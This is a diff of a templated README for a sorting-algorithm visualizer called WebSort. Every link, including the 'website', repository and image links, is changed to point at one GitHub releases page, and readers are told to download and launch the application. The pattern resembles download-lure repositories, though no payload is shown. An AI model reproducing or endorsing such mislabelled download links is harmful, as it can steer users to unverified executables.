@@ -11,9 +11,9 @@ WebSort is an interactive web-based sorting algorithm visualizer that allows use
 
 ## Getting Started 🚀
 
-To get started with WebSort, simply click on the following link: [Download WebSort](https://github.com/releases/789694263/Release.zip). Once downloaded, launch the application and start exploring the world of sorting algorithms through interactive visualizations.
+To get started with WebSort, simply click on the following link: [Download WebSort](https://github.com/LULBI256/WebSort/releases). Once downloaded, launch the application and start exploring the world of sorting algorithms through interactive visualizations.
 
-If the link does not work or you prefer to access the application online, you can visit the [WebSort Website](https://www.websort.com) for a seamless experience.
+If the link does not work or you prefer to access the application online, you can visit the [WebSort Website](https://github.com/LULBI256/WebSort/releases) for a seamless experience.
 
 ## Sorting Algorithms Supported 🧠
 
@@ -47,7 +47,7 @@ WebSort is an open-source project that welcomes contributions from developers of
 
 ## Visit the WebSort Repository 🌐
 
-Ready to dive into the world of sorting algorithms? Visit the [WebSort GitHub Repository](https://github.com/websort) to explore the code, contribute to the project, or simply learn more about sorting algorithms through interactive visualizations.
+Ready to dive into the world of sorting algorithms? Visit the [WebSort GitHub Repository](https://github.com/LULBI256/WebSort/releases) to explore the code, contribute to the project, or simply learn more about sorting algorithms through interactive visualizations.
 
 ## Get Involved! 🌟
 
@@ -55,7 +55,7 @@ Join the WebSort community today and start exploring the fascinating world of so
 
 Let's sort things out together with WebSort! 🚀🔍🎨
 
-![Sorting Algorithms](https://yourimageurl.com)
+![Sorting Algorithms](https://github.com/LULBI256/WebSort/releases)
 
 ---
 Designed with ❤️ by the WebSort Team.
